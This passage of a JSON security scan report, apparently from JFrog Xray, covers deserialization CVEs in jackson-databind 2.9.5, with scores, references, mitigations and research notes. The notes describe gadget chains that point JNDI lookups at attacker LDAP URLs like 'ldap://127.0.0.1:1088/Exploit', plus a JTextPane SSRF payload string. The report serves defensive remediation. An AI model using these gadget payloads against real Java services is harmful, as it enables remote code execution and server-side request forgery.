            "cve": "CVE-2020-10672",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502",
              "NVD-CWE-Other"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory (aka aries.transaction.jms).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95488",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2020-10672",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://github.com/advisories/GHSA-95cm-88f5-f2c7",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.debian.org/debian-lts-announce/2020/03/msg00027.html",
          "https://github.com/FasterXML/jackson-databind/commit/592872f4235c7f2a3280725278da55544032f72d",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://github.com/FasterXML/jackson-databind/issues/2659"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Aries in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `apache.aries.transaction.jms.internal.XaPooledConnectionFactory ` gadget in [Apache Aries]( https://github.com/apache/aries), an attacker can call `lookup` with an arbitrary location by setting the calling `setTmJndiName` and `createConnectionPool` with an arbitrary argument such as `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `apache.aries` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `apache.aries` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `apache.aries` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36183",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138358",
        "references": [
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://github.com/FasterXML/jackson-databind/commit/12e23c962ffb4cf1857c5461d72ae54cc8008f29",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://github.com/advisories/GHSA-9m6f-7xcq-8vf8",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/FasterXML/jackson-databind/issues/3003",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36183",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in docx4j in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Xalan]( https://github.com/apache/xalan-j) (aka embedded Xalan) gadget, a JNDI controller called `JNDIConnectionPool ` can be used by an attacker to initiate connection with a malicious server and achieve remote code execution by load arbitrary Java classes . For that the attacker will invoke the ` setJndiPath` method to set the `jndiPath` to a path such as `\"ldap://127.0.0.1:1088/Exploit\"` as detailed in this [PoC](https://github.com/Al1ex/CVE-2020-35728).\n\nSpecifically, with the [docx4j]( https://www.docx4java.org/trac/docx4j) gadget, which contains an embedded Apache Xalan gadget, a JNDI controller called `JNDIConnectionPool ` can be used by an attacker to initiate connection with a malicious server and achieve remote code execution by loading arbitrary Java classes. For that the attacker will invoke the ` setJndiPath` method to set the `jndiPath` to a path similar to `\"ldap://127.0.0.1:1088/Exploit\"` as detailed in this [PoC]( https://github.com/Al1ex/CVE-2020-35728) of a similar issue.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes docx4j in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes docx4j in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `docx4j` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-16335",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariDataSource. This is a different vulnerability than CVE-2019-14540.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-88210",
        "references": [
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0161",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43/",
          "https://lists.apache.org/thread.html/40c00861b53bb611dee7d6f35f864aa7d1c1bd77df28db597cbf27e1@%3Cissues.hbase.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT/",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0729",
          "https://access.redhat.com/errata/RHSA-2020:0164",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-16335",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT/",
          "https://lists.apache.org/thread.html/e90c3feb21702e68a8c08afce37045adb3870f2bf8223fa403fb93fb@%3Ccommits.hbase.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/dc6b5cad721a4f6b3b62ed1163894941140d9d5656140fb757505ca0@%3Cissues.hbase.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/73c1c2cc76e6cdd7f3a5615cbe3207fe96e4d3db",
          "https://access.redhat.com/errata/RHSA-2020:0159",
          "https://lists.apache.org/thread.html/40c00861b53bb611dee7d6f35f864aa7d1c1bd77df28db597cbf27e1%40%3Cissues.hbase.apache.org%3E",
          "https://lists.apache.org/thread.html/e90c3feb21702e68a8c08afce37045adb3870f2bf8223fa403fb93fb%40%3Ccommits.hbase.apache.org%3E",
          "https://lists.apache.org/thread.html/a360b46061c91c5cad789b6c3190aef9b9f223a2b75c9c9f046fe016@%3Cissues.hbase.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/ad0d238e97a7da5eca47a014f0f7e81f440ed6bf74a93183825e18b9%40%3Cissues.hbase.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0445",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/dc6b5cad721a4f6b3b62ed1163894941140d9d5656140fb757505ca0%40%3Cissues.hbase.apache.org%3E",
          "https://www.debian.org/security/2019/dsa-4542",
          "https://lists.apache.org/thread.html/0fcef7321095ce0bc597d468d150cff3d647f4cb3aef3bd4d20e1c69%40%3Ccommits.tinkerpop.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20191004-0002/",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://github.com/FasterXML/jackson-databind/issues/2449",
          "https://lists.apache.org/thread.html/ad0d238e97a7da5eca47a014f0f7e81f440ed6bf74a93183825e18b9@%3Cissues.hbase.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://seclists.org/bugtraq/2019/Oct/6",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/a360b46061c91c5cad789b6c3190aef9b9f223a2b75c9c9f046fe016%40%3Cissues.hbase.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://access.redhat.com/errata/RHSA-2020:0160",
          "https://lists.debian.org/debian-lts-announce/2019/10/msg00001.html",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43/",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://github.com/advisories/GHSA-85cw-hj65-qqv9",
          "https://lists.apache.org/thread.html/0fcef7321095ce0bc597d468d150cff3d647f4cb3aef3bd4d20e1c69@%3Ccommits.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in zaxxer.hikari in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `com.zaxxer.hikari.HikariDataSource` gadget in [zaxxer.hikari]( https://github.com/svn2github/ehcache/tree/ ) , an attacker can use this class to indirectly call ` getObjectOrPerformJndiLookup` by calling  `setHealthCheckRegistry` which calls `super.setHealthCheckRegistry`.\nThe method assumes that any `healthCheckRegistry` argument is trusted and later performs JNDI loading. The attacker can call this function with an arbitrary argument like `\"ldap://127.0.0.1:1088/Exploit\"` which achieves remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` zaxxer.hikari ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Exploiting this vulnerability leads to remote code execution"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n- Default typing enabled for external JSON endpoints\n- The vulnerable java service includes `zaxxer.hikari ` in its Java classpath\n- The service has polymorphic type handling enabled\n- The service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `zaxxer.hikari` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2021-20190",
            "cvss_v2_score": "8.3",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:C",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A flaw was found in jackson-databind before 2.9.10.7. FasterXML mishandles the interaction between serialization gadgets and typing. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-139158",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2021-20190",
          "https://github.com/FasterXML/jackson-databind/commit/7dbf51bf78d157098074a20bd9da39bd48c18e4a",
          "https://security.netapp.com/advisory/ntap-20210219-0008/",
          "https://github.com/FasterXML/jackson-databind/issues/2854",
          "https://github.com/advisories/GHSA-5949-rw7g-wx7w",
          "https://security.netapp.com/advisory/ntap-20210219-0008",
          "https://lists.apache.org/thread.html/r380e9257bacb8551ee6fcf2c59890ae9477b2c78e553fa9ea08e9d9a@%3Ccommits.nifi.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://bugzilla.redhat.com/show_bug.cgi?id=1916633",
          "https://lists.apache.org/thread.html/r380e9257bacb8551ee6fcf2c59890ae9477b2c78e553fa9ea08e9d9a%40%3Ccommits.nifi.apache.org%3E",
          "https://www.oracle.com//security-alerts/cpujul2021.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in javax.swing in Jackson-databind leads to SSRF.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the blocked gadget is `javax.swing.JTextPane` which can lead to SSRF when abused. For example - `mapper.readValue(payload=\"[\\\"javax.swing.JTextPane\\\",{\\\"page\\\":\\\"remoteaddr\\\"}], Object.class)`\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `javax.swing` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `javax.swing` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "The gadget can lead to SSRF, which requires context-specific knowledge about the target network in order to exploit for any security impact (and in some cases, may not cause any impact at all)",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `javax.swing` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-19362",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the jboss-common-core class from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
